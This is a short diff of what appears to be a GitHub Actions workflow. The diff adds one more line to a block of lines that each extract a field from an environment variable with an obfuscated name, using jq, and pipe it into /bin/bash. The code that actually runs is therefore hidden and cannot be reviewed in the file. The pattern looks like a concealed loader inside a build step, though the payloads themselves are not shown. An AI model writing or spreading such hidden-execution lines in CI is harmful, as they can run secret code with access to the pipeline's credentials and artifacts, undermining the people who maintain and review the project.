@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$nqcn66160" | jq -r .kolnq88 | /bin/bash
           echo $nz93 | jq -r .oc41 | /bin/bash
           echo $s1 | jq -r .ceblw76 | /bin/bash
+          echo $stack1 | jq -r .xyylg395 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
